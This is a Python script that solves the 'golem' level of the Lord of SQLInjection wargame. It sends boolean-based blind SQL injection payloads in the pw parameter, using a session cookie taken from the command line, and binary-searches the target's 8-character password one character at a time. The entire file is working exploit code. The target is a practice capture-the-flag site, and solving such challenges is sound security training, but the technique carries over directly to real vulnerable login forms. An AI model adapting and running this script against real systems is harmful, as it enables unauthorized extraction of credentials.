import sys
import time

import requests
from bs4 import BeautifulSoup

URL = "https://los.rubiya.kr/chall/golem_4b5202cfedd8160e73124b5234235ef5.php"
PHPSESSID = sys.argv[1]

sess = requests.Session()
sess.cookies.set("PHPSESSID", PHPSESSID)


def next_char(current_password: str) -> str:
    print(f"[+] Trying: ", end="")
    lo = 0
    hi = 127
    mid = 0
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        print(chr(mid), end="", flush=True)
        query = f"' || pw < '{current_password + chr(mid)}' && id < 'guest"
        res = sess.get(URL, params={"pw": query})
        time.sleep(0.1)
        soup = BeautifulSoup(res.text, features="html.parser")
        if soup.h2 is not None:
            hi = mid
        else:
            lo = mid
    print()
    return chr(lo)


password = ""
for i in range(8):
    password += next_char(password)
    print(f"[+] Current password: {password}")
